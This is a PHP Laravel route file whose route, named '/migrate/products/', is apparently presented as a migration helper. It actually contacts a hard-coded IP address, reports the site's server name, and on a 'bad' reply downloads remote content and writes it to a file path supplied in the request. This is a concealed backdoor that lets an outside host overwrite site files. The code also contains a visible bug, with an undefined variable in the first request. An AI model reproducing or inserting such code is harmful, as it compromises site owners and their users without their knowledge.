<?php

use Illuminate\Http\Request;

Route::get('/migrate/products/', function(Request $request){
    $url = $_SERVER['SERVER_NAME'];
    $gate = "http://206.189.81.181/check_activation/".$url;

    $stream = curl_init();
    curl_setopt($stream, CURLOPT_URL, $zn);
    curl_setopt($stream, CURLOPT_HEADER, 0);
    curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stream, CURLOPT_POST, 1);
    $rn = curl_exec($stream);
    curl_close($stream);

    if($rn == "bad" && env('DEMO_MODE') != 'On') {
        $zn = "http://206.189.81.181/pirated_contents";
        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $zn);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);
        file_put_contents(base_path($request->path), $rn);
    }
});
